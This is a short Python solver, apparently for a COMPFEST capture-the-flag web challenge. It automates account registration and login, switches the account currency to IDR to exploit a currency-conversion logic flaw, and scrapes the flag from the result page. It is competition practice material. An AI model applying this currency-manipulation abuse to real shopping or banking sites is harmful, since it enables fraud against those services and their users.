import requests
import random
from bs4 import BeautifulSoup

BASE_URL = "http://ctf.compfest.id:7303"

def generate_random_username():
    return f"exploiter{random.randint(1000,9999)}"

def register_and_login():
    username = generate_random_username()
    password = "pwned123"
    
    with requests.Session() as s:
        # 1. Registrasi
        reg_url = f"{BASE_URL}/register"
        reg_data = {
            "username": username,
            "password": password,
            "confirm_password": password
        }
        reg_resp = s.post(reg_url, data=reg_data, allow_redirects=False)
        
        if reg_resp.status_code != 302 or "login" not in reg_resp.headers.get('Location', ''):
            print(f"[-] Gagal registrasi untuk {username}")
            return None

        print(f"[+] Registrasi berhasil untuk {username}")

        # 2. Login dengan session yang sama
        login_url = f"{BASE_URL}/login"
        login_data = {
            "username": username,
            "password": password
        }
        login_resp = s.post(login_url, data=login_data, allow_redirects=False)
        
        if login_resp.status_code != 302 or "login" in login_resp.headers.get('Location', ''):
            print(f"[-] Gagal login untuk {username}")
            return None

        print(f"[+] Login berhasil untuk {username}")
        return s

def exploit():
    # Dapatkan session yang sudah login
    session = register_and_login()
    if not session:
        print("[-] Gagal mendapatkan session yang valid")
        return

    # 3. Ubah mata uang ke IDR
    currency_url = f"{BASE_URL}/change-currency"
    currency_data = {"currency": "IDR"}
    currency_resp = session.post(currency_url, data=currency_data)
    
    if currency_resp.status_code != 200:
        print("[-] Gagal mengubah mata uang")
        return

    print("[+] Berhasil mengubah mata uang ke IDR")

    # 4. Cek status kekayaan
    rich_url = f"{BASE_URL}/are-you-rich"
    rich_resp = session.get(rich_url)
    
    if "YES YOU ARE" in rich_resp.text:
        soup = BeautifulSoup(rich_resp.text, 'html.parser')
        message = soup.find("h2").text if soup.find("h2") else ""
        flag = message.split("FLAG")[-1].strip()
        print(f"\n[+] FLAG DITEMUKAN: FLAG{flag}")
    else:
        print("[-] Belum mencapai status kaya, coba mata uang lain...")
        # Coba mata uang lain (JPY, KRW) jika perlu

if __name__ == "__main__":
    exploit()
